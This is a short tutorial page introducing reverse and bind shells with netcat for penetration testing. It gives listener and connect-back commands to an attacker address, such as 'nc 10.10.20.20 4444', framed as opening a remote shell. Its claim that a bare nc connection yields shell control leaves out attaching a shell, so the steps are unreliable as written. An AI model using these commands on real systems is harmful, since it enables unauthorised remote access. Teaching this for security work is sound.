---
title: Reverse shells and bind shells
description: An introduction to reverse shells and bind shells using netcat.
tags: [cybersecurity, linux]
---

{% include "disclaimer.liquid" %}

Reverse shells and bind shells are types of network connections used in hacking and penetration testing.

A reverse shell is when the attacker makes a target computer connect back their own computer, where they can then control the target's shell. To do this, the attacker uses special tools to set up a 'listener' on the attacking computer, which waits for the target to connect.

In contrast, a bind shell is when a attacker makes the target computer run a 'listener' directly, that allows the attacker to connect and control it.

A reverse or bind shell is usually established after a target computer has been exploited. In this article we will not be discussing how to exploit a target, but we will be covering how to establish a reverse or bind shell using a tool called netcat.

## Netcat

Netcat is a command-line tool used for network communication. It can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system.

One of netcat's main advantages is its wide availability. Netcat is preinstalled on many Linux distributions, and it can be also installed on Windows.

When establishing a **reverse shell**, we need to start a listener on the attacking computer, and then connect to it from the target computer.

We can set up the listener on the attacking computer with `nc -lvnp <PORT>`, e.g. `nc -lvnp 4444`.

The `-lvnp 4444` options are:

- `l` = listen mode
- `v` = verbose mode
- `n` = numeric only (IP address), don't use DNS
- `p 4444` = listen on port `4444`

Now, we need connect to the listener from the target computer. To do this, we use `nc <ATTACKER-IP> <PORT>`, e.g. `nc 10.10.20.20 4444` if the attacker's IP is `10.10.20.20` and the attacker is listening on port `4444`.

Once the connection is established, we will be able to send shell commands to the target's shell from the attacker's computer! 🎉

When establishing a **bind shell**, we need to start a listener on the target computer, and then connect to it from the attacking computer.

Set up the the listener on the target computer with `nc -lvnp <PORT>`, and then connect to the listener from the attacking computer with `nc <TARGET-IP> <PORT>`.

When setting up reverse and binding shells, keep in mind:

- The port on the listener can be blocked by firewalls, so be sure to find a port that is open.
- Administrative permissions (i.e. `sudo`) are needed when listening on a port below `1024`.
